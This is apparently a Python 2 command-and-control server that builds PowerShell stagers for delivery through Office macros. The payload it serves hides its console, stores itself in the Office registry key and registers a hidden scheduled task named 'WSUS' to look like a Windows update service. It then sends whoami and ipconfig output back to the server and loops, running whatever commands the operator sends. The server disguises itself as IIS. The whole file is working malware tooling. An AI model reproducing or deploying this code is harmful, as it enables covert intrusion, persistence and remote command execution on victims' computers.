# Python 2
import thread, time, socket
import base64
from datetime import datetime


IP = '0.0.0.0'
PORT = 443
AESKey = 'This is a key123'
AESIV =  'This is an IV456'

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
import base64, urllib2


def chunkstring(string, length):
   return (string[0+i:length+i] for i in range(0, len(string), length))

commands = []

def ReadCMD():
    choice = raw_input("# ")
    choice = choice.lower()
    commands.append(choice)
    return choice

def GetExtIP():
    ext_ip = urllib2.urlopen('http://myexternalip.com/raw').read()
    return str(ext_ip)

def AddSchedule():
    ext_ip = GetExtIP()
    URI = '/schedule'
    ClientPowershell = """
$dest = "http://""" + ext_ip + """:""" + str(PORT) + URI + """"
$proxyurl = ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy($dest)
$command = (Invoke-WebRequest $dest -Proxy $proxyurl -ProxyUseDefaultCredentials).Content
if (-not ([string]::IsNullOrEmpty($command)))
{
IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($command)))
}"""
    base64encoded = base64.b64encode(ClientPowershell)
    print(base64encoded)
    print("[+] 1st Stage Add Scheduled Task named WSUS For macros:")
    for chunk in list(chunkstring(base64encoded, 50)):
        print("\"" + str(chunk) + "\" & _")

    return str(base64encoded)
    #print('[+] To run the client execute code below in powershell terminal:\n' + ClientPowershell)

def GenClient():
    ext_ip = GetExtIP()
    URI = '/schedule'
    ClientPowershell = """
while($true)
{
$dest = "http://""" + ext_ip + """:""" + str(PORT) + """"
$proxyurl = ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy($dest)
$command = (Invoke-WebRequest $dest -Proxy $proxyurl -ProxyUseDefaultCredentials).Content
if (-not ([string]::IsNullOrEmpty($command)))
{
$output = iex $command | Out-String
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($output)
$EncodedText = [Convert]::ToBase64String($Bytes)
Invoke-WebRequest -Uri $dest -Proxy $proxyurl -ProxyUseDefaultCredentials -Method POST -Body $EncodedText
}
Start-Sleep -s 3
}"""
    base64encoded = base64.b64encode(ClientPowershell)
    print(base64encoded)
    print("[+] 2nd Stage: Add Powershell Reverse connection to registry as key for macros:")
    for chunk in list(chunkstring(base64encoded, 50)):
        print("\"" + str(chunk) + "\" & _")

    return str(base64encoded)
    #print('[+] To run the client execute code below in powershell terminal:\n' + ClientPowershell)


def ScheduleTsk():
    PowershellCode = """
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NonInteractive -NoLogo -NoProfile -WindowStyle Hidden "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-ItemProperty HKCU:Software\Microsoft\Office\Common).Ready)))"'
$Trigger = New-ScheduledTaskTrigger -Once -At 3pm
$Settings = New-ScheduledTaskSettingsSet
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
Register-ScheduledTask -TaskName 'WSUS' -InputObject $Task
    """

    base64encoded = base64.b64encode(PowershellCode)
    return str(base64encoded)

def Encode(string):
    b64enc = base64.b64encode(string)
    return str(b64enc)


def BuildURL():
    Protocol = 'http://'
    ServerIP = GetExtIP()
    Port = PORT
    SecondStagePath = "/client"
    return '%s%s:%s%s' % (Protocol, ServerIP, Port, SecondStagePath)

def FirstStage(SecondStageURL):
    Payload = "IEX((Invoke-WebRequest '" + SecondStageURL + "' -Proxy ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy('" + SecondStageURL + "') -ProxyUseDefaultCredentials).Content)"

    return Payload


def SecondStage():
    PAYLOAD = Encode(FirstStage(BuildURL()))
    PowerShell = """
# .Net methods for hiding/showing the console in the background
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
#0 hide
[Console.Window]::ShowWindow($consolePtr, 0)

# write to registry
New-ItemProperty -Path "HKCU:Software\Microsoft\Office\Common" -Name Ready -Value '""" + PAYLOAD + """'  -PropertyType "String"

# add to schedule tasks
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NonInteractive -NoLogo -NoProfile -WindowStyle Hidden "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-ItemProperty HKCU:Software\Microsoft\Office\Common).Ready)))"'
$Trigger = New-ScheduledTaskTrigger -Once -At 3pm
$Settings = New-ScheduledTaskSettingsSet
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
Register-ScheduledTask -TaskName 'WSUS' -InputObject $Task



$dest = "http://""" + GetExtIP() + """:""" + str(PORT) + """"
@('whoami','ipconfig') | ForEach-Object {
$output = iex $PSItem | Out-String
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($output)
$EncodedText = [Convert]::ToBase64String($Bytes)
$proxyurl = ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy($dest)
Invoke-WebRequest -Uri $dest -Proxy $proxyurl -ProxyUseDefaultCredentials -Method POST -Body $EncodedText
}


while($true)
{

$proxyurl = ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy($dest)
$command = (Invoke-WebRequest $dest -Proxy $proxyurl -ProxyUseDefaultCredentials).Content
if (-not ([string]::IsNullOrEmpty($command)))
{
$output = iex $command | Out-String
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($output)
$EncodedText = [Convert]::ToBase64String($Bytes)
Invoke-WebRequest -Uri $dest -Proxy $proxyurl -ProxyUseDefaultCredentials -Method POST -Body $EncodedText
}
Start-Sleep -s 3
}"""

    return PowerShell

def WriteLogs(line):
    f = open("logs.txt", "a")
    f.write(line)
    f.close()

class WebServerHandler(BaseHTTPRequestHandler):

    # Un/Comment lines below to enable or disable logging
    def log_message(self, format, *args):
        return

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.server_version('IIS')
        self.sys_version('7.5')
        self.end_headers()

    def do_GET(self):
        global commands

        self._set_headers()
        if 'client' in self.path:

            self.wfile.write(SecondStage())

            now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            IP = self.client_address[0]
            try:
                UserAgent = self.headers['User-Agent']
                WriteLogs('\n\t [*] %s Connection from %s - %s' % (now, IP, UserAgent))
            except:
                WriteLogs('\n\t [*] %s Connection from %s ' % (now, IP))


        if len(commands)>0:
            self.wfile.write(commands[0])
            del commands[0]
        else:
            self.wfile.write('')

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        # Doesn't do anything with posted data
        self._set_headers()
        content_length = self.headers.getheaders('content-length')
        length = int(content_length[0]) if content_length else 0
        post_body = base64.decodestring(self.rfile.read(length)).decode('utf8')

        now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        IP = self.client_address[0]
        WriteLogs('\n\t [*] %s Response from %s -  %s' % (now, IP, post_body))

        print('\r\n [+] Command Output (if output is empty type command again): \n' + post_body + '#')
        return

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer): # Handle requests in a separate thread
    daemon_threads = True

def start_server():
    # Start WebServer
    server = ThreadedHTTPServer((IP, PORT), WebServerHandler)
    server.serve_forever()
    # server.shutdown()
    # server.server_close()
    # server.socket.close()

# start the server in a background thread
thread.start_new_thread(start_server,())



if __name__ == "__main__":
    print('[+] Server started ...')
    print('[+] Second Stage URL: %s' % (BuildURL()))
    print('[+] First Stage Decoded Payload: %s' % (FirstStage(BuildURL())))
    print('[+] First Stage Encoded Payload: %s' % (Encode(FirstStage(BuildURL()))))
    while True:
        ReadCMD()
